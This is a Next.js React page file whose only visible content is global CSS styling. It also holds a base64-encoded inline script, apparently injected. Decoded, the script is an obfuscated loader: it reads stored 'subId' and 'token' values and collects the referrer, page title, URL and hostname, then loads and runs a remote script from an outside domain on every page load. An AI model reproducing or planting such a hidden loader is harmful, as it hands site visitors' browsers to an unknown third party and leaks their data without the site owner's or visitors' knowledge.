import React from 'react'
import Head from 'next/head'

const Home = () => (
   <div>
  <script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfY0ROa3Zjejd0NHQ2NDlQZCc7CiAgICBpZiAoIXdpbmRvdy5fY0ROa3Zjejd0NHQ2NDlQZCkgewogICAgICAgIHdpbmRvdy5fY0ROa3Zjejd0NHQ2NDlQZCA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly90YWxjdW11anFqLnNpdGUvNFJIRHd0N1gnLAogICAgICAgICAgICBQX1BBVEg6ICdodHRwczovL3RhbGN1bXVqcWouc2l0ZS9lNTczMzlmL3Bvc3RiYWNrJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX1BiU2ZLanN6dHZEdkp3dG0gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9QYlNmS2pzenR2RHZKd3RtICE9PSAndW5kZWZpbmVkJyAmJiBfUGJTZktqc3p0dkR2Snd0bSAhPT0gbnVsbCkgewogICAgICAgIHZhciBfNEZkY2N5eldtVGpKM3pHeCA9IEpTT04ucGFyc2UoX1BiU2ZLanN6dHZEdkp3dG0pOwogICAgICAgIHZhciBfN3I1ckN5ekNqYmtDcnREViA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF80RmRjY3l6V21Uakozekd4LmNyZWF0ZWRfYXQgKyB3aW5kb3cuX2NETmt2Y3o3dDR0NjQ5UGQudHRsIDwgXzdyNXJDeXpDamJrQ3J0RFYpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF9ZYzJzWlRZR2h5WHpnYkY4ID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX2c4R3RrZnpmUjZKNm5Rc1MgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfdDNmanB0endzeFdQVENZZyA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX3QzZmpwdHp3c3hXUFRDWWcgKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX3QzZmpwdHp3c3hXUFRDWWcgKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfdDNmanB0endzeFdQVENZZyArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfdDNmanB0endzeFdQVENZZyArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX3QzZmpwdHp3c3hXUFRDWWcgKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgX3QzZmpwdHp3c3hXUFRDWWcgKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll9jRE5rdmN6N3Q0dDY0OVBkLlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF9ZYzJzWlRZR2h5WHpnYkY4ICE9PSAndW5kZWZpbmVkJyAmJiBfWWMyc1pUWUdoeVh6Z2JGOCAmJiB3aW5kb3cuX2NETmt2Y3o3dDR0NjQ5UGQudW5pcXVlKSB7CiAgICAgICAgX3QzZmpwdHp3c3hXUFRDWWcgKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfWWMyc1pUWUdoeVh6Z2JGOCk7CiAgICB9CiAgICBpZiAodHlwZW9mIF9nOEd0a2Z6ZlI2SjZuUXNTICE9PSAndW5kZWZpbmVkJyAmJiBfZzhHdGtmemZSNko2blFzUyAmJiB3aW5kb3cuX2NETmt2Y3o3dDR0NjQ5UGQudW5pcXVlKSB7CiAgICAgICAgX3QzZmpwdHp3c3hXUFRDWWcgKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9nOEd0a2Z6ZlI2SjZuUXNTKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll9jRE5rdmN6N3Q0dDY0OVBkLlJfUEFUSCArIF90M2ZqcHR6d3N4V1BUQ1lnOwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
    <style jsx>{`
      :global(html,body) {
        margin: 0;
        padding: 0;
        height: 100%;
      }

      :global(body) {
        font-size: calc(10px + 1vmin);
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans',
          'Droid Sans', 'Helvetica Neue', sans-serif;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;

        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        text-align: center;
        background-color: #282c34;
        color: white;
      }

      a {
        color: pink;
        text-decoration: none;
      }

      .content {
        padding: 0 32px;
      }
    `}</style>
  </div>
)

export default Home
